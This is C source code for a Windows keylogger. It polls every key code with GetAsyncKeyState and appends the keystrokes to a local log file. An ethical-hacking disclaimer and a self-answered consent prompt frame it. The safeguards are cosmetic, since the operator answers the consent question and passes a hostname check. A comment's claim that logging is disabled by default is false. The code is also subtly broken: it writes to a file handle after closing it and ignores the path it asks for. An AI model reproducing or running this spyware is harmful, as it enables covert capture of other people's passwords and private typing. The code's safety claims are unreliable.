#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <time.h>

// ⚠️ LEGAL DISCLAIMER:
// This program is designed for **ethical hacking**, **forensic analysis**, and **educational purposes** only.
// Unauthorized use, distribution, or deployment of this tool without proper consent is ILLEGAL and could result
// in criminal and civil penalties.
//
// If you are not the authorized owner of the system, DO NOT run this program.
// Do not use this code to monitor or capture any keystrokes without obtaining explicit and informed consent
// from all individuals involved.
//
// This tool is intended for controlled environments where you have received written permission from relevant parties,
// such as during cybersecurity exercises, penetration tests, or authorized audits.
//
// The author and repository maintainers are not responsible for any misuse, unlawful activities, or legal consequences
// resulting from the use of this software. Always ensure you have full authorization before running this tool on any system.

int consentGiven = 0;  // Flag to check user consent
FILE *logFile = NULL;  // File to store logs

// Function to display a consent prompt
void getUserConsent() {
    int choice;
    printf("This program will log keystrokes for forensic analysis ONLY.\n");
    printf("Do you have proper authorization and consent to proceed? (1 = Yes, 0 = No): ");
    scanf("%d", &choice);

    if (choice != 1) {
        printf("Consent not given. Exiting program.\n");
        exit(0);
    }
    consentGiven = 1;  // Consent is given

    // Log the user's consent for accountability
    logFile = fopen("consent_log.txt", "a+");
    if (logFile != NULL) {
        time_t now;
        time(&now);
        fprintf(logFile, "Consent granted on: %s", ctime(&now));  // Record the date/time of consent
        fclose(logFile);
    }
}

// Function to log keystrokes to a file (DISABLED by default)
void logKey(int key) {
    if (logFile == NULL) {
        logFile = fopen("keylog.txt", "a+");
        if (!logFile) {
            printf("Failed to open log file for writing. Exiting program.\n");
            exit(1);
        }
    }

    // Log key presses with special keys identified
    if (key == VK_RETURN)
        fprintf(logFile, "[ENTER]");
    else if (key == VK_BACK)
        fprintf(logFile, "[BACKSPACE]");
    else if (key == VK_TAB)
        fprintf(logFile, "[TAB]");
    else if (key == VK_ESCAPE)
        fprintf(logFile, "[ESCAPE]");
    else if (key == VK_SPACE)
        fprintf(logFile, " ");
    else if (key >= 32 && key <= 126)  // Printable characters
        fprintf(logFile, "%c", key);
    else
        fprintf(logFile, "[%d]", key);  // Log non-printable keys
}

// Function to ensure the program runs only in controlled environments
void checkExecutionEnvironment() {
    char filePath[MAX_PATH];
    printf("Please enter the file path where you want to save keystrokes (e.g., C:\\Users\\YourName\\Desktop\\keylog.txt): ");
    scanf("%s", filePath);

    // Confirm the file path exists and can be written to
    if (access(filePath, F_OK) != 0) {
        printf("The specified path does not exist. Please enter a valid path.\n");
        exit(1);
    }

    // Confirm that the program is running on the expected environment (e.g., only in a VM or safe system)
    // (For demonstration purposes, you could check the system username, hostname, etc.)
    char hostname[MAX_PATH];
    gethostname(hostname, sizeof(hostname));
    if (strstr(hostname, "trusted_system") == NULL) {  // Example check
        printf("This program is not running in a trusted environment. Exiting...\n");
        exit(1);
    }
}

// Main function to capture keystrokes
int main() {
    // Get user consent first
    getUserConsent();

    // Ensure we're running in a controlled environment
    checkExecutionEnvironment();

    if (consentGiven) {
        printf("Keystroke logging started in a controlled environment.\n");
        printf("Press Ctrl + C to stop the program.\n");

        // Inform the user of the safe execution mode
        printf("The console window will remain visible for full transparency.\n");

        while (1) {
            for (int key = 8; key <= 255; key++) {
                if (GetAsyncKeyState(key) & 0x8000) {
                    logKey(key);  // Log the pressed key
                    fflush(logFile);  // Ensure immediate write to file
                    Sleep(10);  // Slight delay to avoid excessive file I/O
                }
            }
        }

        fclose(logFile);
    }

    return 0;
}